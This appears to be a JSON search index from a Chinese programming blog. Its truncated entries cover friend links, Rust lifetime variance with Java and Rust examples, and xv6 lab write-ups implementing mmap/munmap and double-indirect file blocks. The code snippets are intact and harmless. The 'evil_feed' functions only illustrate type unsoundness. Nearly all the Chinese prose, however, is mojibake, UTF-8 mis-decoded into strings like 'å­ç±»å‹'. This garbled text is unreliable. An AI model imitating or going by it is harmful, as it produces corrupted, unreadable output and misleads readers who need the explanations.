[{"categories":null,"content":"å“²å®‡é…±: https://rinchannowww.github.io åœŸè±†å›: https://ipotato.me/ Qå“¥: https://qjx.app/ å­¦åˆ†: https://sprinter1999.github.io ğŸŸå¤§ä½¬: https://blog.name1e5s.com/ è¢å·¨å·¨: https://columbine21.github.io/ LeiWang1999: https://leiblog.wang ","date":"2021-12-22","objectID":"/friendlinks/:0:0","tags":null,"title":"å‹æƒ…é“¾æ¥","uri":"/friendlinks/"},{"categories":["rust"],"content":"æœ€è¿‘å¯¹ rust çš„ç”Ÿå‘½å‘¨æœŸæœ‰ä¸€äº›ç–‘æƒ‘ï¼Œåœ¨æ‰¾èµ„æ–™å­¦ä¹ çš„è¿‡ç¨‹ä¸­è‡ªç„¶å°±äº†è§£åˆ°ç”± rust ç”Ÿå‘½å‘¨æœŸå¯¼å‡ºçš„ rust subtypeã€variance çš„æ¦‚å¿µï¼Œå¯¹è¿™ä¸€å—å„¿çš„å­¦ä¹ ä¹Ÿè§£ç­”äº†æˆ‘ä¸€äº›å¯¹å…¶ä»–è¯­è¨€çš„é—®é¢˜,åŒæ—¶æˆ‘ä¹Ÿè¢«è®¤è¯†çš„å¤§ä½¬èµ¶é¸­å­ä¸Šæ¶,åœ¨ BUPT Rust Meetup åšäº†åˆ†äº«,keynote è®²ç¨¿åœ¨æ­¤ã€‚ å­ç±»å‹ä¸å˜å½¢ å­ç±»å‹æ˜¯ç¨‹åºè¯­è¨€ç±»å‹ç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ¦‚å¿µï¼ŒWikipedia å¯¹å…¶æœ‰å¦‚ä¸‹è§£é‡Šï¼š If S is a subtype of T, the subtyping relation is often written S \u003c: T, to mean that any term of type S can be safely used in a context where a term of type T is expected. è®¸å¤šè¯­è¨€çš„ç±»å‹ç³»ç»Ÿéƒ½æ”¯æŒå­ç±»å‹ï¼Œæœ€ç›´æ¥ã€æœ€ç†Ÿæ‚‰çš„åº”å½“å°±æ˜¯é¢å‘å¯¹è±¡ä¸­ç»§æ‰¿å…³ç³»å½¢æˆçš„å­ç±»å‹ã€‚ä¾‹å¦‚Catç±»ç»§æ‰¿äº†Animalç±»ï¼Œé‚£ä¹ˆCatæ˜¯Animalçš„å­ç±»å‹ï¼ˆCat \u003c: Animalï¼‰ï¼Œç›´è§‰ä¸Šå¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œä»»ä½•éœ€è¦Animalçš„è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ç”¨Catå»æ›¿æ¢ï¼Œè¿™ä¹Ÿæ˜¯é‡Œæ°æ›¿æ¢åŸåˆ™(Liskov substitution principle)ï¼š Let $q(x)$ be a property provable about $x$ of type T. Then $q(y)$ should be true for objects $y$ of type $S$ where $S$ is a subtype of T. ç»§æ‰¿å…³ç³»å¾ˆç›´æ¥å¯¼å‡ºäº†ä¸¤ä¸ªå…·ä½“ç±»å‹çš„ä¹‹é—´çš„å­ç±»å‹å…³ç³»ï¼Œå¯ç”±ç±»å‹æ„é€ å™¨äº§ç”Ÿçš„ä¸€äº›æ›´å¤æ‚çš„ç±»å‹ä¹‹é—´çš„å­ç±»å‹å…³ç³»å¦‚ä½•ç¡®å®šå‘¢ï¼Ÿ F(T)ä¸ºç±»å‹æ„é€ å™¨ï¼ŒS \u003c: Tï¼Œ é‚£ä¹ˆF(S)å’ŒF(T)çš„æœ‰æ²¡æœ‰å­ç±»å‹å…³ç³»å‘¢?å¦‚æœæœ‰ï¼Œè°æ˜¯è°çš„å­ç±»å‹å‘¢ï¼Ÿå¤æ‚ç±»å‹ä¹‹é—´çš„å­ç±»å‹å…³ç³»å–å†³äºç±»å‹æ„é€ å™¨ï¼Œç›¸å¯¹äºåŸå§‹ç±»å‹ï¼Œå¯èƒ½æ˜¯ä¿æŒã€åè½¬æˆ–è€…æ— å…³ã€‚ å¦‚æœæ˜¯æ˜¯ä¿æŒï¼Œå³F(S) \u003c: F(T)ï¼Œåˆ™ç§°ä¹‹ä¸ºåå˜(covariant) å¦‚æœæ˜¯åè½¬ï¼Œå³F(T) \u003c: F(S)ï¼Œåˆ™ç§°ä¹‹ä¸ºé€†å˜(contravariant) å¦‚æœæ˜¯æ— å…³ï¼Œåˆ™ç§°ä¹‹ä¸ºä¸å˜/æŠ—å˜(invariant) covariantã€contravariantçš„æ¦‚å¿µæ¥è‡ªäºèŒƒç•´è®º(Category Theory)ä¸­çš„å‡½å­(Functor)ã€‚ å˜å½¢ä¸ç±»å‹å®‰å…¨ åœ¨ä¸‹é¢çš„ Java ä»£ç ä¸­ï¼ŒCat[]èµ‹å€¼ç»™Animal[]ç±»å‹çš„å˜é‡å¯ä»¥é€šè¿‡ç¼–è¯‘ï¼Œä½†æ˜¯ArrayList\u003cCat\u003eèµ‹å€¼ç»™ArrayList\u003cAnimal\u003eç±»å‹çš„å˜é‡åˆ™æ— æ³•é€šè¿‡ç¼–è¯‘ã€‚è¯´æ˜ Java åœ¨ç¼–è¯‘æ—¶å¯¹æ•°ç»„é‡‡ç”¨äº†åå˜ï¼Œè€Œå¯¹æ³›å‹å®¹å™¨é‡‡ç”¨äº†æŠ—å˜ã€‚ä½†æ˜¯åœ¨è¿è¡Œæ—¶ï¼Œå¯¹æ•°ç»„å…ƒç´ è¿›è¡Œé”™è¯¯çš„èµ‹å€¼ï¼Œä¼šæŠ›å‡ºè¿è¡Œæ—¶é”™è¯¯ï¼Œè¿™å®é™…æ˜¯ä¸€ç§å¯¹äºç¼–è¯‘æœŸæ•°ç»„åå˜çš„è¡¥æ•‘ï¼Œæ•°ç»„é‡‡ç”¨åå˜æœ¬èº«æ˜¯ä¸€ç§å¾ˆå·®åŠ²çš„è®¾è®¡ã€‚ static class Animal { private int name; } static class Cat extends Animal { public Cat() { } public void meow() { System.out.println(\"meow\"); } } static class Dog extends Animal { public Dog() { } public void bark() { System.out.println(\"bark\"); } } public static void main(String[] args) throws Exception { // covariant, ok Animal[] animals = new Animal[10]; animals = new Cat[10]; // runtime error animals[0] = new Dog(); // invariant, compile error List\u003cAnimal\u003e listAnimals = new ArrayList\u003cAnimal\u003e(); listAnimals = new ArrayList\u003cCat\u003e(); } ç”±æ­¤å¯è§ï¼Œå¯¹äºæ”¯æŒå­ç±»å‹çš„è¯­è¨€ï¼Œå˜å½¢çš„è®¾è®¡æ˜¯éå¸¸é‡è¦ï¼Œå…¶ä¼šå½±å“ç¨‹åºçš„ç±»å‹å®‰å…¨ã€‚ é‚£ä¹ˆï¼Œä»€ä¹ˆæ—¶å€™é‡‡ç”¨åå˜ï¼Œä»€ä¹ˆæ—¶å€™é‡‡ç”¨é€†å˜ï¼Œåˆåœ¨ä»€ä¹ˆæ—¶å€™é‡‡ç”¨æŠ—å˜å‘¢ï¼Ÿ æƒ³ä¸€ä¸‹è¿™æ ·ä¸€ä¸ªç¨‹åºï¼Œä¸€ä¸ªå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªç¬¼å­å‚æ•°ï¼Œç¬¼å­é‡Œé¢è£…ç€åŠ¨ç‰©ï¼Œä¸ç®¡ä¼ é€’çš„ç¬¼å­å‚æ•°ä¸­è£…ç€ä»€ä¹ˆåŠ¨ç‰©ï¼Œéƒ½å°†ç¬¼å­ä¸­çš„åŠ¨ç‰©æ›¿æ¢æˆä¸€åªç‹—ï¼Œè¿™æ ·åšçš„è¯ï¼Œå½“è°ƒç”¨å®Œå‡½æ•°åï¼Œå¤–éƒ¨ç¨‹åºç»§ç»­å°†ç¬¼å­ä¸­çš„åŠ¨ç‰©å½“ä½œåŸåŠ¨ç‰©æ¥å¯¹å¾…ï¼Œç±»å‹å®‰å…¨å°±å®Œè›‹äº†ã€‚ static class Cage\u003cT extends Animal\u003e { public T inner; public Cage(T a) { this.inner = a; } } static void evil_feed(Cage\u003cAnimal\u003e cage) { cage.inner = new Dog(); } public static void main(String[] args) throws Exception { Cage\u003cCat\u003e cage = new Cage\u003cCat\u003e(new Cat()); evil_feed(cage); cage.inner.meow(); } ä¸Šé¢çš„è¿™æ®µ Java ä»£ç å½“ç„¶æ˜¯æ— æ³•ç¼–è¯‘æˆåŠŸçš„ï¼Œå› ä¸º Java ä¸å¯¹æ³›å‹å®¹å™¨ä½¿ç”¨åå˜ã€‚ä½†æ˜¯ä¸èƒ½ä½¿ç”¨åå˜çš„ä¾æ®æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ˜¯è¯»å†™æ“ä½œã€‚ å¦‚æœä¸€ä¸ªå®¹å™¨åªè¯»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå˜ï¼Œå°†ä¸€ä¸ªCage\u003cCat\u003eå½“ä½œCage\u003cAnimal\u003eè¯»å–ï¼Œä»»ä½•æ—¶å€™éƒ½ä¸ä¼šå‡ºé”™ï¼›å¦‚æœç±»å‹åªå†™ï¼Œé‚£ä¹ˆå‡½æ•°ä¸­çš„æ“ä½œåªèƒ½å¯¹å®¹å™¨å†…å®¹è¿›è¡Œå†™å…¥æˆ–è€…ä»€ä¹ˆéƒ½ä¸åšï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥è€ƒè™‘é€†å˜ï¼Œå³Cage\u003cAnimal\u003eæ˜¯Cage\u003cDog\u003eçš„å­ç±»å‹ï¼Œå¯¹äºä»»ä½•éœ€è¦Cage\u003cDog\u003eçš„å‡½æ•°ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ä¼ å…¥Cage\u003cAnimal\u003eï¼Œå‡½æ•°åªä¼šå‘å…¶ä¸­å†™å…¥ä¸€åªDogï¼Œè€Œä¸å…³å¿ƒåŸæ¥æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”ç¨‹åºä¹Ÿæ°¸è¿œä¹Ÿä¸ä¼šå»è¯»Cageé‡Œçš„ä¸œè¥¿ï¼Œç¨‹åºè¯­è¨€ä¸­ï¼Œé€†å˜åŸºæœ¬ä¸å‡ºç°ï¼›å¦‚æœç±»å‹å¯è¯»å¯å†™ï¼Œé‚£ä¹ˆåªèƒ½æ˜¯æŠ—å˜ï¼Œè¦æ±‚ç±»å‹ä¸¥æ ¼ä¸€è‡´æ¥ä¿è¯ç±»å‹å®‰å…¨ã€‚ ç±»å‹æ„é€ å™¨å¯¼è‡´é€†å˜çš„æƒ…å†µéå¸¸å°‘ï¼Œä¸»è¦å‡ºç°åœ¨ä»¥å‡½æ•°ä½œä¸ºç±»å‹æ„é€ å™¨æ—¶ï¼š $$ F(U) \\rightarrow V $$ å¦‚ä¸Šçš„ä¸€å…ƒå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªUç±»å‹çš„å‚æ•°ï¼Œè¿”å›ä¸€ä¸ªVç±»å‹çš„å€¼ã€‚å¦‚æœæœ‰U \u003c: Tï¼Œé‚£ä¹ˆä»»ä½•éœ€è¦$F(U) \\rightarrow V$çš„åœ°æ–¹ï¼Œå¯ä»¥ä½¿ç”¨$F(T) \\rightarrow V$ä»£æ›¿ï¼Œè¿™å¾ˆç›´è§‚ï¼Œå› ä¸ºUæ˜¯Tçš„å­ç±»å‹ï¼Œæ‰€ä»¥ä¸€ä¸ªèƒ½å¤„ç† T ç±»å‹çš„å‡½æ•°å¿…ç„¶èƒ½å¤„ç† U ç±»å‹ï¼Œä¾‹å¦‚ä¸€ä¸ªèƒ½è®¡ç®—Animalå¹´é¾„çš„å‡½æ•°ä¸€å®šä¹Ÿèƒ½è®¡ç®—Catçš„å¹´é¾„ï¼Œæ‰€ä»¥æœ‰ï¼š $$ U \u003c: T \\Rightarrow F(T) \\rightarrow V \u003c: F(U) \\rightarrow V $$ å³æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªä½œç”¨åŸŸè¾ƒå¤§çš„å‡½æ•°ä»£æ›¿ä¸€ä¸ªä½œç”¨åŸŸè¾ƒå°çš„å‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥åœ¨ä½¿ç”¨æ—¶å®‰å…¨åœ°æ”¶ç¼©å®ƒçš„ä½œç”¨åŸŸè‡³å’Œåè€…ä¸€æ ·ï¼Œå³åªä½¿ç”¨Animalä¸­å±äºCatçš„é‚£ä¸€éƒ¨åˆ†ã€‚ Rust ç”Ÿå‘½å‘¨æœŸ Rust æ²¡æœ‰ç±»å‹ç»§æ‰¿ï¼Œä½†æ˜¯ Rust æœ‰ lifetime å•Šï¼Œæ‰€ä»¥ Rust çš„å­ç±»å‹å¿…å®šæ˜¯æŒ‡ lifetime ä¹‹é—´çš„å…³ç³»ã€‚ åœ¨ Rust ä¸­ï¼Œ'a:'bæ„æ€æ˜¯'a outlives 'bï¼Œå³'aè¡¨ç¤ºçš„ç”Ÿå‘½å‘¨æœŸå¤§äºç­‰äº'bï¼Œä¹Ÿä»£è¡¨ç€'a \u003c: 'bã€‚ä¹ä¸€çœ‹æœ‰ç‚¹åç›´è§‰ï¼Œä½†ä¹Ÿå¾ˆå¥½ç†è§£ã€‚'a:'bä»£è¡¨'aè‡³å°‘å’Œ'bä¸€æ ·é•¿ï¼Œå³'aæ¯”'bæ›´åŠ ç‰¹åŒ–ï¼Œå°±åƒCatè‡³å°‘æ˜¯ç§Animalï¼ŒCatæ›´åŠ ç‰¹åŒ–ã€‚'staticå…³é”®å­—ä»£è¡¨é™æ€ç”Ÿå‘½å‘¨æœŸï¼Œåœ¨ç¨‹åºçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­æŒç»­å­˜åœ¨ï¼Œæ‰€ä»¥'staticæ˜¯ä»»æ„ç”Ÿå‘½å‘¨æœŸ'açš„å­ç±»å‹ã€‚ æˆ‘ä»¬ç»å¸¸ä¼šæ„Ÿå¹äº Rust ç¼–è¯‘å™¨çš„æ™ºèƒ½ï¼Œèƒ½å‡†ç¡®æ¨æ–­å‡ºç¨‹åºä¸­æŸä¸ªå¼•ç”¨çš„ç”Ÿå‘½å‘¨æœŸä¸å¤Ÿé•¿ã€ä¸åŒ¹é…ã€‚è¿™åŒæ—¶ä¹Ÿæ˜¯å­ç±»å‹å’Œå˜å½¢çš„åŠŸåŠ³ã€‚æ ¹æ®ä¸Šæ–‡è®¨è®ºçš„ç»“è®ºï¼ŒRust ç”Ÿå‘½å‘¨æœŸçš„å­ç±»å‹æœ‰å¦‚ä¸‹å˜å½¢è§„åˆ™ï¼š â€˜a T U * \u0026'a T covariant covariant * \u0026'a mut T covariant invariant * Box\u003cT\u003e covariant Vec\u003cT\u003e covariant * UnsafeCell\u003cT\u003e invariant Cell\u003cT\u003e invariant * fn(T) -\u003e U contravariant covariant *const T covariant *mut T invariant æˆ‘ä»¬çœ‹å¦‚ä¸‹è¿™ä¸ªä¾‹å­ï¼š fn evil_feeder\u003cT\u003e(input: \u0026mutT,val: T){*input=val;}fn main(){letmutmr_snuggles: \u0026'static str =\"meow! :3\";// mr. snuggles forever!! {letspike=String::from(\"bark! \u003e:V\");letspike_str: \u0026str =\u0026spike;// Only lives for the block evil_feeder(\u0026mutmr_snuggles,spike_str);// EVIL! }println!(\"{}\",mr_snuggles);// Use after free? } ç¼–è¯‘ç»“æœï¼š æˆ‘ä»¬ä¸€çœ¼å°±èƒ½çœ‹å‡ºï¼Œspike_strçš„ lifetime å¤ªçŸ­äº†ï¼Œä¸å¯èƒ½å¤åˆ¶ç»™mr_snugglesï¼Œé‚£ä¹ˆç¼–è¯‘å™¨æ˜¯å¦‚ä½•æ¨æ–­çš„å‘¢ï¼Ÿ å› ä¸º\u0026mut Tæ˜¯å¯¹ T çš„ invariantï¼Œæ‰€ä»¥ç¼–è¯‘å™¨æ¨æ–­ T å¿…é¡»æ˜¯\u0026'static strï¼› spike_stræ˜¯ä¸€ä¸ª\u0026'a strï¼Œå¯¹","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:0:0","tags":["rust","variance","subtype"],"title":"Rustç”Ÿå‘½å‘¨æœŸä¸å˜å½¢","uri":"/posts/rust-lifetime-variance/"},{"categories":["OS"],"content":"mmapå’Œmunmapç³»ç»Ÿè°ƒç”¨å…è®¸ UNIX ç¨‹åºå¯¹å…¶åœ°å€ç©ºé—´è¿›è¡Œæ›´ä¸ºç»†è‡´çš„æ§åˆ¶ã€‚å®ƒä»¬å¯ç”¨äºåœ¨è¿›ç¨‹é—´å…±äº«å†…å­˜ï¼Œå°†æ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´ï¼Œå¹¶ä½œä¸ºç”¨æˆ·çº§page faultæ–¹æ¡ˆçš„ä¸€éƒ¨åˆ†ã€‚åœ¨æœ¬å®éªŒå®¤ä¸­ï¼Œæˆ‘ä»¬å°†åœ¨xv6ä¸­æ·»åŠ mmapå’Œmunmapç³»ç»Ÿè°ƒç”¨ï¼Œé‡ç‚¹æ˜¯memory-mapped filesã€‚ Lab: mmap mmapçš„ API å¦‚ä¸‹ï¼š void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); åœ¨xv6ä¸­ï¼Œaddrå§‹ç»ˆä¸º 0ï¼Œæ‰€ä»¥ç”±kernelè‡ªè¡Œåˆ¤æ–­åº”å½“ map çš„åœ°å€ï¼›protè¡¨ç¤ºäº† mapped memory çš„ Rã€Wã€X æƒé™ï¼Œflagsä¸ºMAP_SHAREDæˆ–è€…MAP_PRIVATEï¼Œå‰è€…è¡¨ç¤ºå¯¹ mapped memory çš„ä¿®æ”¹åº”å†™å›æ–‡ä»¶ï¼Œåè€…åˆ™ä¸éœ€è¦ï¼›offeræ°¸è¿œä¸º 0ï¼Œä¸ç”¨å¤„ç†æ–‡ä»¶çš„åç§»é‡ï¼›mmap æˆåŠŸå°†è¿”å›å¯¹åº”å†…å­˜èµ·å§‹åœ°å€ï¼›å¤±è´¥è¿”å›0xffffffffffffffffã€‚ munmap(addr, length)éœ€è¦å°†ä» addr å¼€å§‹çš„é•¿åº¦ä¸ºlengthçš„å†…å­˜unmapã€‚å®éªŒæŒ‡å¯¼ä¹¦ä¿è¯è¢«munmapçš„è¿™æ®µå†…å­˜ä½äºmmapå†…å­˜åŒºé—´çš„å¤´éƒ¨/å°¾éƒ¨æˆ–è€…æ˜¯å…¨éƒ¨ï¼Œmunmapä¸ä¼šåœ¨ä¸­é—´æŒ–ä¸€ä¸ªæ´ï¼›å½“å†…å­˜æ˜¯ä»¥MAP_SHAREDæ¨¡å¼è¢«mmapæ—¶ï¼Œéœ€è¦å…ˆå°†ä¿®æ”¹å†™å›æ–‡ä»¶ã€‚ çœ‹å®Œäº†å¯¹äºmmapå’Œmunmapçš„è¦æ±‚ï¼Œå‘ç°å…¶å®æµ‹è¯•æ²¡æœ‰ä¸€äº›æ¯”è¾ƒéš¾çš„caseï¼Œä¸ºæˆ‘ä»¬çš„å®ç°æä¾›äº†ä¾¿åˆ©ã€‚ ä¹‹åï¼Œå°±å¯ä»¥è·Ÿç€ hints å®Œæˆå®éªŒï¼š é¦–å…ˆæ·»åŠ mmapå’Œmunmapçš„ç³»ç»Ÿè°ƒç”¨å£°æ˜ï¼Œå¹¶ä¸”åœ¨Makefileä¸­åŠ å…¥_mmaptestã€‚ å¯¹ mapped memory è¦ä½¿ç”¨ lazy allocationï¼Œå°±åƒåœ¨ä¹‹å‰çš„å®éªŒä¸­é‚£æ ·ï¼Œè¿™æ ·å­ä½¿å¾—æˆ‘ä»¬å¯ä»¥åœ¨ç‰©ç†å†…å­˜æœ‰é™çš„æƒ…å†µä¸‹mmapå°½å¯èƒ½å¤§çš„æ–‡ä»¶ã€‚ è®°å½•mmapä¸ºæ¯ä¸ªè¿›ç¨‹ map æ–‡ä»¶çš„æƒ…å†µï¼Œä¾‹å¦‚åœ°å€ï¼Œé•¿åº¦ï¼Œæƒé™ï¼Œå¯¹åº”çš„æ–‡ä»¶ç­‰ç­‰ã€‚ç”±äºxv6æ²¡æœ‰çœŸæ­£çš„å†…å­˜åˆ†é…å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªå®šé•¿çš„æ•°ç»„å»å­˜å‚¨ï¼Œ16 å°±è¶³å¤Ÿäº†ã€‚ struct VMA { int used; uint64 addr; uint64 end; int prot; int flags; int offset; struct file *f; }; // in struct proc struct VMA vma[NVMA]; uint64 mmap_start; å®ç°mmapï¼Œä»ç”¨æˆ·åœ°å€ç©ºé—´æ‰¾åˆ°ç©ºé—²å¤„ map æ–‡ä»¶ï¼Œä¿®æ”¹å¯¹åº”çš„VMAç»“æ„ä½“è®°å½•ï¼Œå½“å¯¹æ–‡ä»¶mmapåï¼Œåº”å½“å¢åŠ æ–‡ä»¶çš„å¼•ç”¨è®¡æ•°(filedup)ï¼Œè¿™æ ·å½“æ–‡ä»¶è¢«å…³é—­æ—¶ï¼ŒVMAæŒæœ‰çš„æ–‡ä»¶æŒ‡é’ˆæ‰ä¸ä¼šå¤±æ•ˆã€‚ æœ€é‡è¦çš„å°±æ˜¯æ‰¾åˆ°åˆé€‚çš„ç©ºé—²åœ°å€ï¼Œç”¨äºmmapã€‚xv6çš„ç”¨æˆ·åœ°å€ç©ºé—´å¦‚ä¸‹å›¾ï¼š æœ€é¡¶éƒ¨æ˜¯trampolineå’Œtrapframeï¼Œå®ƒä»¬å ç”¨äº†ä¸¤ä¸ª pageï¼Œå’Œstackä¹‹é—´æœ‰å¾ˆå¤§çš„ç©ºé—²åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶ map åˆ°trapframeä¹‹ä¸‹ï¼Œä¸æ–­å‘ä¸‹å¢é•¿ï¼Œmmap_startè®°å½•ç€trapframeä¸‹å¯ç”¨äºmmapçš„èµ·å§‹åœ°å€ï¼Œåˆå§‹å€¼ä¸ºPGROUNDDOWN(MAXVA - (2 * PGSIZE))ã€‚ uint64 sys_mmap(void) { int length, prot, flags, fd; struct file *f; if(argint(1, \u0026length) \u003c 0 || argint(2, \u0026prot) \u003c 0 || argint(3, \u0026flags) \u003c 0 || argfd(4, \u0026fd, \u0026f) \u003c 0) { return 0xffffffffffffffff; } if (!f-\u003ewritable \u0026\u0026 flags == MAP_SHARED \u0026\u0026 (prot \u0026 PROT_WRITE)) { return 0xffffffffffffffff; } // find a vma struct proc *p = myproc(); struct VMA *v; for (v = p-\u003evma; v \u003c p-\u003evma + NVMA; v++) { if(!v-\u003eused) { break; } } if(v == p-\u003evma + NVMA) { return -1; } filedup(f); v-\u003eaddr = PGROUNDDOWN(p-\u003emmap_start - length); v-\u003eend = v-\u003eaddr + length; p-\u003emmap_start = v-\u003eaddr; v-\u003eused = 1; v-\u003ef = f; v-\u003eprot = prot; v-\u003eflags = flags; v-\u003eoffset = 0; return v-\u003eaddr; } å½“å‘ç”Ÿpage faultæ—¶ï¼Œä¸ºå…¶åˆ†é…ä¸€ä¸ªçœŸå®çš„ç‰©ç†é¡µé¢ï¼Œä½¿ç”¨readiå°†æ–‡ä»¶å†…å®¹è¯»å…¥å†…å­˜ï¼Œç„¶åå°†ç‰©ç†é¡µé¢ map åˆ°ç”¨æˆ·åœ°å€ç©ºé—´ï¼Œè®°å¾—æ­£ç¡®è®¾ç½®é¡µé¢çš„æƒé™ã€‚ else if (r_scause() == 13 || r_scause() == 15) { uint64 va = r_stval(); if (va \u003e MAXVA) { p-\u003ekilled = 1; } else { if(mmap_alloc(p-\u003epagetable, va) \u003c 0) { p-\u003ekilled = 1; } } } int mmap_alloc(pagetable_t pagetable, uint64 va) { char *mem; struct proc *p = myproc(); struct VMA *v; // find vma struct for (v = p-\u003evma; v \u003c p-\u003evma + NVMA; v++) { if(v-\u003eused \u0026\u0026 va \u003e= v-\u003eaddr \u0026\u0026 va \u003c v-\u003eend) { break; } } if (v == p-\u003evma + NVMA) { return -1; } mem = kalloc(); if(mem == 0){ return -1; } memset(mem, 0, PGSIZE); begin_op(); ilock(v-\u003ef-\u003eip); int len; if((len = readi(v-\u003ef-\u003eip, 0, (uint64)mem, va - v-\u003eaddr, PGSIZE)) \u003c 0) { iunlock(v-\u003ef-\u003eip); end_op(); return -1; } iunlock(v-\u003ef-\u003eip); end_op(); int f = PTE_U | (v-\u003eprot \u003c\u003c 1); if(mappages(pagetable, va, PGSIZE, (uint64)mem, f) != 0) { kfree(mem); return -1; } return 0; } å®ç°munmapï¼Œæ‰¾åˆ°å¯¹åº”çš„VMAï¼Œä½¿ç”¨uvmunmap unmap å¯¹åº”çš„å†…å­˜ï¼Œå½“ä¸€ä¸ªmmapçš„æ‰€æœ‰å†…å­˜éƒ½è¢« unmap æ—¶ï¼Œéœ€è¦å‡å°‘å¯¹åº”æ–‡ä»¶çš„å¼•ç”¨è®¡æ•°ï¼›å¦‚æœå†…å­˜è¢«ä¿®æ”¹è¿‡ï¼Œä¸”æ˜¯ä»¥MAP_SHAREDæ¨¡å¼è¢«mmapï¼Œé‚£ä¹ˆéœ€è¦å…ˆå°†å†…å­˜å†…å®¹å†™å›æ–‡ä»¶ã€‚ç†æƒ³æ€ä¸‹ï¼Œæˆ‘ä»¬åªåº”å½“å†™å›dirty pageï¼Œä½†æ˜¯æµ‹è¯•ä¸­ä¸ä¼šæ£€æŸ¥è¿™ä¸€ç‚¹ï¼Œæ‰€ä»¥å°†æ‰€æœ‰å†…å­˜å†™å›æ–‡ä»¶å³å¯äº†ã€‚ struct file* fileundup(struct file *f) { acquire(\u0026ftable.lock); if(f-\u003eref \u003c 1) panic(\"filedup\"); f-\u003eref--; release(\u0026ftable.lock); return f; } uint64 sys_munmap(void) { uint64 addr; int length; if(argaddr(0, \u0026addr) \u003c 0 || argint(1, \u0026length) \u003c 0) { return -1; } return s_munmap(addr, length); } uint64 s_munmap(uint64 addr, int length) { struct proc *p = myproc(); struct VMA *v; for (v = p-\u003evma; v \u003c p-\u003evma + NVMA; v++) { if(v-\u003eused \u0026\u0026 v-\u003eaddr \u003c= addr \u0026\u0026 addr + length \u003c= v-\u003eend) { break; } } if(v == p-\u003evma + NVMA) { return -1; } uint64 end = addr + length; uint64 _addr = addr; while (addr \u003c end) { // if already load in if(walkaddr(p-\u003epagetable, addr)) { if(v-\u003eflags == MAP_SHARED \u0026\u0026 v-\u003ef-\u003ewritable) { begin_op(); ilock(v-\u003ef-\u003eip); int size = min(end-addr, PGSIZE); if(writei(v-\u003ef-\u003eip, 1, addr, addr - v-\u003eaddr, size) \u003c size) { iunlock(v-\u003ef-\u003eip); end_op(); return -1; } iunlock(v-\u003ef-\u003eip); end_op(); } uvmunmap(p-\u003epagetable, addr,","date":"2021-03-03","objectID":"/posts/6-s081-lab10-mmap/:0:0","tags":["6.S081","mmap"],"title":"6.S081 lab10 mmap","uri":"/posts/6-s081-lab10-mmap/"},{"categories":["OS"],"content":"Large files æœ¬å…³éœ€è¦ä¸ºxv6æ·»åŠ å¯¹å¤§æ–‡ä»¶çš„æ”¯æŒã€‚xv6çš„ inode é»˜è®¤ä½¿ç”¨ 12 ä¸ªç›´æ¥å—æŒ‡é’ˆå’Œ 1 ä¸ªé—´æ¥å—æŒ‡é’ˆï¼ˆæŒ‡å‘ä¸€ä¸ªå­˜å‚¨ç€å—æŒ‡é’ˆçš„æ•°æ®å—ï¼‰ï¼Œæ‰€ä»¥xv6æ”¯æŒçš„æœ€å¤§æ–‡ä»¶å°ºå¯¸æ˜¯12 + 1*256=268ä¸ª blockã€‚æˆ‘ä»¬éœ€è¦å°†ä¸€ä¸ªç›´æ¥å—æŒ‡é’ˆä¿®æ”¹ä¸ºåŒé‡é—´æ¥å—æŒ‡é’ˆï¼ˆæ‰§è¡Œä¸€ä¸ªå­˜å‚¨ç€é—´æ¥å—æŒ‡é’ˆçš„æ•°æ®å—ï¼‰ï¼Œå°†xv6çš„æœ€å¤§æ–‡ä»¶å°ºå¯¸æ‰©å±•åˆ°11 + 1*256 + 1*256*256= 65803ä¸ª blockã€‚ é¦–å…ˆæˆ‘ä»¬ä¿®æ”¹kernel/fs.hä¸­çš„ç›¸å…³å®å®šä¹‰ï¼š #define NDIRECT 11 #define NINDIRECT (BSIZE / sizeof(uint)) #define NDOUBLEINDIRECT ((BSIZE / sizeof(uint)) * (BSIZE / sizeof(uint))) #define MAXFILE (NDIRECT + NINDIRECT + NDOUBLEINDIRECT) ç„¶åä¿®æ”¹dinodeå’Œinodeä¸­çš„åœ°å€æ•°ç»„å®šä¹‰ï¼š uint addrs[NDIRECT+2]; æ¥ä¸‹æ¥ä¿®æ”¹bmapå‡½æ•°ï¼Œè¯¥å‡½æ•°ç”¨äºå°†ä¸€ä¸ªæ–‡ä»¶çš„é€»è¾‘å—å·è½¬æ¢ä¸ºè®¾å¤‡çš„ç‰©ç†å—å·ï¼Œç±»ä¼¼äºè™šå®åœ°å€è½¬æ¢ï¼š static uint bmap(struct inode *ip, uint bn) { uint addr, *a; struct buf *bp; if(bn \u003c NDIRECT){ if((addr = ip-\u003eaddrs[bn]) == 0) ip-\u003eaddrs[bn] = addr = balloc(ip-\u003edev); return addr; } bn -= NDIRECT; if(bn \u003c NINDIRECT){ // Load indirect block, allocating if necessary. if((addr = ip-\u003eaddrs[NDIRECT]) == 0) ip-\u003eaddrs[NDIRECT] = addr = balloc(ip-\u003edev); bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; if((addr = a[bn]) == 0){ a[bn] = addr = balloc(ip-\u003edev); log_write(bp); } brelse(bp); return addr; } bn -= NINDIRECT; if(bn \u003c NDOUBLEINDIRECT){ // Load double-indirect block, allocating if necessary. if((addr = ip-\u003eaddrs[NDIRECT+1]) == 0) ip-\u003eaddrs[NDIRECT+1] = addr = balloc(ip-\u003edev); bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; uint level1 = bn / NINDIRECT; if((addr = a[level1]) == 0){ a[level1] = addr = 